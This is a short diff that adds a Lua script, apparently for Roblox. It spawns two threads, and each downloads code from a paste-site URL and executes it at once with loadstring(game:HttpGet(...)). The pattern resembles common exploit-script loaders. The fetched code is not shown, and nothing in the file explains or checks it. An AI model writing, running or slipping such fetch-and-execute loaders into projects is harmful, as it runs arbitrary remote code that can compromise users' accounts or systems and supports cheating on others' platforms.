@@ -1,0 +1,9 @@
+-- Load first script in a separate thread
+spawn(function()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/RsogMQjh1s/0"))()
+end)
+
+-- Load second script in another separate thread
+spawn(function()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/uD8LYWv5eo/0"))()
+end)
